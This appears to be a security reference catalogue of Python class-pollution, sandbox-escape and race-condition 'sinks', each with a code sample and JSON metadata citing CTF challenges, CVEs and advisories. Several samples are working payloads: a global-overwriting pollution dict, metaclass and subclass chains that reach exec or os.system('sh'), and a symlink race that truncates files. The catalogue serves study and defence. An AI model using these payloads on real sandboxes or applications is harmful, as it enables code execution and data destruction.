### Class Pollution via `__class__.__init__.__globals__`
**Risk**: Python's equivalent of JavaScript prototype pollution. Recursive merge functions that call `setattr` on user-controlled input allow mutating any global variable.

```python
def set_(dst, src):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                set_(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            set_(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

payload = {
    "__class__": {
        "__init__": {
            "__globals__": {
                "session": {"user": "witch"}
            }
        }
    }
}
set_(session, payload)
```
**Refs**: Bauhinia CTF 2023, idekCTF 2022, DownUnderCTF 2024.

```json
{
  "sink_id": "CLASS-001",
  "category": "CLASS",
  "title": "Class Pollution via __class__.__init__.__globals__",
  "severity": "high",
  "affected_versions": ["3.x"],
  "sources": [
    {
      "type": "blog_post",
      "url": "https://blog.abdulrah33m.com/prototype-pollution-in-python/",
      "title": "Prototype Pollution in Python",
      "author": "Abdulrah33m",
      "date": "2023-08-23",
      "verified": true,
      "tags": ["class-pollution", "prototype-pollution", "setattr", "__globals__", "ctf"]
    }
  ],
  "confidence": "confirmed"
}
```

### `__init_subclass__` Hook Abuse
**Risk**: Executes automatically when any class inherits from a class defining it. Bypasses sandboxes that block `ast.Call` but allow class definitions.

```python
class LegitimateParent:
    def __init_subclass__(cls, **kwargs):
        super().__init_subclass__(**kwargs)
        import os; os.system('whoami')

class Payload(LegitimateParent):
    pass  # Triggers hook immediately
```
**Refs**: UIUCTF 2024 "ASTea", Langflow CVE-2025-3248.

```json
{
  "sink_id": "CLASS-002",
  "category": "CLASS",
  "title": "__init_subclass__ Hook Abuse",
  "severity": "high",
  "affected_versions": ["3.6+"],
  "sources": [
    {
      "type": "blog_post",
      "url": "https://docs.python.org/3/reference/datamodel.html#object.__init_subclass__",
      "title": "3. Data model — object.__init_subclass__",
      "author": "Python Software Foundation",
      "date": "2026-04-29",
      "verified": false,
      "tags": ["__init_subclass__", "class-definition", "sandbox-bypass", "ctf"]
    }
  ],
  "confidence": "likely"
}
```

### `__class_getitem__` Fallback to Metaclass
**Risk**: CPython falls back to the metaclass's `__class_getitem__` even when the class already defines its own.

```python
class Meta(type):
    def __class_getitem__(cls, key):
        return f'meta got {key!r}'

class Ham(metaclass=Meta):
    pass

Ham[10]  # "meta got 10" — unexpected fallback
```
**Ref**: CPython Issue #122634.

```json
{
  "sink_id": "CLASS-003",
  "category": "CLASS",
  "title": "__class_getitem__ Fallback to Metaclass",
  "severity": "medium",
  "affected_versions": ["3.x"],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/122634",
      "title": "Class subscription falls back to metaclass __class_getitem__ unexpectedly",
      "author": "python/cpython",
      "date": "2024-08-01",
      "gh_issue": "python/cpython#122634",
      "verified": false,
      "tags": ["cpython", "metaclass", "__class_getitem__", "subscription"]
    }
  ],
  "confidence": "likely"
}
```

### Metaclass `__getitem__` = exec
**Risk**: Class subscription `Class['code']` triggers `__getitem__` without an `ast.Call` node.

```python
class Metaclass(type):
    __getitem__ = exec

class Sub(metaclass=Metaclass):
    pass

Sub['import os; os.system("sh")']  # RCE!
```
**Refs**: b01lers CTF 2023 "ez-class", BuckeyeCTF 2024 "gentleman".

```json
{
  "sink_id": "CLASS-004",
  "category": "CLASS",
  "title": "Metaclass __getitem__ Execution Sink",
  "severity": "critical",
  "affected_versions": ["3.x"],
  "sources": [
    {
      "type": "blog_post",
      "url": "https://docs.python.org/3/reference/datamodel.html#object.__getitem__",
      "title": "3. Data model — object.__getitem__",
      "author": "Python Software Foundation",
      "date": "2026-04-29",
      "verified": true,
      "tags": ["metaclass", "__getitem__", "exec", "ast-bypass", "ctf"]
    }
  ],
  "confidence": "confirmed"
}
```

### `type.__getattribute__` Trampoline — AST Bypass
**Risk**: AST filters blocking `ast.Attribute` miss string-based attribute access via `type.__getattribute__`.

```python
type.__getattribute__(
    type.__getattribute__(obj, "__class__"),
    "__subclasses__"
)()[X].__init__.__globals__['os'].system('sh')
```
**Ref**: PraisonAI CVE-2026-40158.

```json
{
  "sink_id": "CLASS-005",
  "category": "CLASS",
  "title": "type.__getattribute__ Trampoline AST Bypass",
  "severity": "high",
  "affected_versions": ["3.x"],
  "sources": [
    {
      "type": "blog_post",
      "url": "https://docs.python.org/3/reference/datamodel.html#object.__getattribute__",
      "title": "3. Data model — object.__getattribute__",
      "author": "Python Software Foundation",
      "date": "2026-04-29",
      "verified": false,
      "tags": ["__getattribute__", "attribute-bypass", "ast-bypass", "sandbox-escape"]
    }
  ],
  "confidence": "likely"
}
```

### `__kwdefaults__` Pollution
**Risk**: Overwriting function keyword-only parameter defaults via class pollution.

```python
def execute(command):
    print(f"Executing {command}")

payload = {
    '__class__': {
        '__init__': {
            '__globals__': {
                'execute': {
                    '__kwdefaults__': {'command': 'echo HACKED'}
                }
            }
        }
    }
}
```
**Refs**: idekCTF 2022, YesWeHack Dojo #32.

```json
{
  "sink_id": "CLASS-006",
  "category": "CLASS",
  "title": "Function __kwdefaults__ Pollution",
  "severity": "high",
  "affected_versions": ["3.x"],
  "sources": [
    {
      "type": "blog_post",
      "url": "https://blog.abdulrah33m.com/prototype-pollution-in-python/",
      "title": "Prototype Pollution in Python",
      "author": "Abdulrah33m",
      "date": "2023-08-23",
      "verified": true,
      "tags": ["__kwdefaults__", "class-pollution", "function-defaults", "ctf"]
    }
  ],
  "confidence": "confirmed"
}
```

### `isinstance` Fast-Path Bypass
**Risk**: Python's `isinstance()` has a fast path: if `type(instance) is cls`, it immediately returns `True` **without** calling custom `__instancecheck__`.

```python
class Meta(type):
    def __instancecheck__(cls, instance):
        return False

class Target(metaclass=Meta):
    pass

t = Target()
isinstance(t, Target)  # May short-circuit despite __instancecheck__ returning False
```
**Refs**: CPython Issue #46578, Issue #144873.

```json
{
  "sink_id": "CLASS-007",
  "category": "CLASS",
  "title": "isinstance Fast-Path Bypass",
  "severity": "medium",
  "affected_versions": ["3.x"],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/46578",
      "title": "isinstance bypasses __instancecheck__ on exact type matches",
      "author": "python/cpython",
      "date": "2022-01-27",
      "gh_issue": "python/cpython#46578",
      "verified": false,
      "tags": ["isinstance", "__instancecheck__", "fast-path", "cpython"]
    }
  ],
  "confidence": "likely"
}
```

### ABC `_abc_cache` Corruption
**Risk**: Bogus `__subclasses__` on an ABC breaks `isinstance` checks for **other** ABCs in the same session.

```python
import abc
class EvilABC(abc.ABC):
    def __init_subclass__(cls, **kwargs):
        super().__init_subclass__(**kwargs)
        cls.__subclasses__ = lambda: ...  # Returns ellipsis
```
**Ref**: CPython Issue #117255.

```json
{
  "sink_id": "CLASS-008",
  "category": "CLASS",
  "title": "ABC _abc_cache Corruption via __subclasses__ Override",
  "severity": "medium",
  "affected_versions": ["3.x"],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/117255",
      "title": "ABC cache corruption from invalid __subclasses__ behavior",
      "author": "python/cpython",
      "date": "2024-04-08",
      "gh_issue": "python/cpython#117255",
      "verified": false,
      "tags": ["abc", "_abc_cache", "__subclasses__", "isinstance", "cpython"]
    }
  ],
  "confidence": "likely"
}
```

### `register()` Virtual Subclass Bypass
**Risk**: `ABCMeta.register()` creates virtual subclasses that pass `isinstance()` without implementing abstract methods.

```python
import abc
class Incomplete(abc.ABC):
    @abc.abstractmethod
    def critical_method(self): pass

class BadClass:
    pass

Incomplete.register(BadClass)
isinstance(BadClass(), Incomplete)  # True!
```
**Ref**: CPython Issue #66677.

```json
{
  "sink_id": "CLASS-009",
  "category": "CLASS",
  "title": "ABCMeta.register Virtual Subclass Bypass",
  "severity": "medium",
  "affected_versions": ["3.x"],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/66677",
      "title": "Virtual subclass registration bypasses abstract interface guarantees",
      "author": "python/cpython",
      "date": "2015-06-08",
      "gh_issue": "python/cpython#66677",
      "verified": false,
      "tags": ["abc", "register", "virtual-subclass", "abstractmethod", "cpython"]
    }
  ],
  "confidence": "likely"
}
```

---

## Prototype / Property Injection Sinks

### `object.__setattr__` Bypass
**Risk**: Custom `__setattr__` implementations can be bypassed by calling `object.__setattr__` directly.

```python
class Foo(object):
    def __setattr__(self, attr, value):
        pass

f = Foo()
object.__setattr__(f, '__class__', Bar)  # Bypasses custom __setattr__
```
**Ref**: BalsnCTF pyshv3.

```json
{
  "sink_id": "PROTO-001",
  "category": "PROTO",
  "title": "object.__setattr__ Bypass",
  "severity": "high",
  "affected_versions": ["3.x"],
  "sources": [
    {
      "type": "blog_post",
      "url": "https://docs.python.org/3/reference/datamodel.html#object.__setattr__",
      "title": "3. Data model — object.__setattr__",
      "author": "Python Software Foundation",
      "date": "2026-04-29",
      "verified": true,
      "tags": ["object.__setattr__", "attribute-bypass", "pyjail", "ctf"]
    }
  ],
  "confidence": "confirmed"
}
```

### `getattr`/`setattr` Hook Bypass (Lupa CVE-2026-34444)
**Risk**: Security hooks on `__getattribute__` don't cover the `getattr()`/`setattr()` builtins.

```python
# obj.attr          → Filtered
# getattr(obj, "attr")  → NOT filtered
getattr(user, "__class__")  # Bypasses attribute_filter
```
**Ref**: Lupa GHSA-69v7-xpr6-6gjm.

```json
{
  "sink_id": "PROTO-002",
  "category": "PROTO",
  "title": "getattr/setattr Hook Bypass",
  "severity": "high",
  "affected_versions": ["3.x"],
  "sources": [
    {
      "type": "github_advisory",
      "url": "https://github.com/advisories/GHSA-69v7-xpr6-6gjm",
      "title": "Lupa sandbox attribute filter bypass via getattr/setattr",
      "author": "GitHub Advisory Database",
      "date": "2026-01-01",
      "ghsa": "GHSA-69v7-xpr6-6gjm",
      "verified": false,
      "tags": ["lupa", "getattr", "setattr", "hook-bypass", "sandbox-escape"]
    }
  ],
  "confidence": "likely"
}
```

### `dir()` Index-Based Attribute Lookup
**Risk**: Substring blacklists never see blocked words generated at runtime via `dir()`.

```python
attrs = dir([])
i_class = attrs.index('__class__')
cls = getattr([], attrs[i_class])  # [].__class__ without typing the word
```
**Ref**: InCTF 2018.

```json
{
  "sink_id": "PROTO-003",
  "category": "PROTO",
  "title": "dir() Index-Based Attribute Lookup",
  "severity": "medium",
  "affected_versions": ["3.x"],
  "sources": [
    {
      "type": "blog_post",
      "url": "https://docs.python.org/3/library/functions.html#dir",
      "title": "Built-in Functions — dir",
      "author": "Python Software Foundation",
      "date": "2026-04-29",
      "verified": true,
      "tags": ["dir", "attribute-enumeration", "blacklist-bypass", "pyjail", "ctf"]
    }
  ],
  "confidence": "confirmed"
}
```

### `vars()` Enumeration Bypass
**Risk**: `vars(object)` returns `object.__dict__`, allowing attribute modification without typing blocked strings.

```python
vars(controlled_object)['__class__'] = MaliciousClass
```

```json
{
  "sink_id": "PROTO-004",
  "category": "PROTO",
  "title": "vars() Enumeration Bypass",
  "severity": "medium",
  "affected_versions": ["3.x"],
  "sources": [
    {
      "type": "blog_post",
      "url": "https://docs.python.org/3/library/functions.html#vars",
      "title": "Built-in Functions — vars",
      "author": "Python Software Foundation",
      "date": "2026-04-29",
      "verified": true,
      "tags": ["vars", "__dict__", "attribute-enumeration", "blacklist-bypass"]
    }
  ],
  "confidence": "confirmed"
}
```

---

## Race Condition Sinks

### `filelock` Symlink TOCTOU (CVE-2025-68146)
**Risk**: `SoftFileLock._acquire()` checks permissions then opens the file — attacker can drop a symlink in between.

```python
# Attacker creates symlink during TOCTOU window
os.symlink(victim_file, lock_path)
# Victim's os.open follows symlink, truncates victim_file
```
**Refs**: GHSA-w853-jp5j-5j7f, Snyk SNYK-PYTHON-FILELOCK-14458335.

```json
{
  "sink_id": "RACE-001",
  "category": "RACE",
  "title": "filelock SoftFileLock Symlink TOCTOU",
  "severity": "high",
  "affected_versions": ["3.x"],
  "sources": [
    {
      "type": "github_advisory",
      "url": "https://github.com/advisories/GHSA-w853-jp5j-5j7f",
      "title": "filelock symlink race in SoftFileLock._acquire",
      "author": "GitHub Advisory Database",
      "date": "2025-09-17",
      "cve_id": "CVE-2025-68146",
      "ghsa": "GHSA-w853-jp5j-5j7f",
      "verified": false,
      "tags": ["filelock", "symlink", "toctou", "race-condition"]
    }
  ],
  "confidence": "likely"
}
```
